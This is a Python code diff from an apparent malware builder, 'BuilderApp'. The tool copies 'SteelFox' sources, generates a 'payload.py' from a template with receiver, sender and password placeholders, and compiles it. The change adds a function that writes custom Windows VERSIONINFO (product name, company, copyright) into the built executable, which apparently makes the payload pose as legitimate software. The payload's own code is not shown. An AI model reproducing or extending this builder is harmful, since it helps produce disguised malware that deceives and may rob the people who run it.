@@ -486,10 +486,8 @@ class BuilderApp:
                 self._set_status("Copie des sources SteelFox...", FG_DIM)
                 self._copy_steelfox(tmp)
 
-                # Copier le fichier de version pour l'exécutable
-                ver_src = ROOT_DIR / "version_payload.txt"
-                if ver_src.exists():
-                    shutil.copy2(str(ver_src), str(tmp / "version_payload.txt"))
+                # Générer dynamiquement les infos de version Windows
+                self._write_version_info(tmp, name)
 
                 self._set_status("Generation du payload...", FG_DIM)
                 script = tmp / "payload.py"
@@ -526,6 +524,45 @@ class BuilderApp:
         shutil.copytree(str(src_pkg), str(tmp / "steelfox"),
                         ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
         shutil.copy2(str(src_main), str(tmp / "steelfox.py"))
+
+    @staticmethod
+    def _write_version_info(tmp: Path, name: str) -> None:
+        """Génère un fichier VERSIONINFO Windows avec le nom personnalisé."""
+        ver = f"""# UTF-8
+VSVersionInfo(
+  ffi=FixedFileInfo(
+    filevers=(1, 0, 0, 0),
+    prodvers=(1, 0, 0, 0),
+    mask=0x3f,
+    flags=0x0,
+    OS=0x40004,
+    fileType=0x1,
+    subtype=0x0,
+    date=(0, 0)
+  ),
+  kids=[
+    StringFileInfo(
+      [
+        StringTable(
+          '040904B0',
+          [
+            StringStruct('CompanyName', 'Tiger-Foxx'),
+            StringStruct('FileDescription', '{name}'),
+            StringStruct('FileVersion', '1.0.0.0'),
+            StringStruct('InternalName', '{name}'),
+            StringStruct('LegalCopyright', 'Copyright 2026 Tiger-Foxx. All rights reserved.'),
+            StringStruct('OriginalFilename', '{name}.exe'),
+            StringStruct('ProductName', '{name}'),
+            StringStruct('ProductVersion', '1.0.0.0'),
+          ]
+        )
+      ]
+    ),
+    VarFileInfo([VarStruct('Translation', [1033, 1200])])
+  ]
+)
+"""
+        (tmp / "version_payload.txt").write_text(ver, encoding="utf-8")
 
     def _generate_payload(self, receiver: str, sender: str, password: str) -> str:
         """Remplace les placeholders dans le template."""
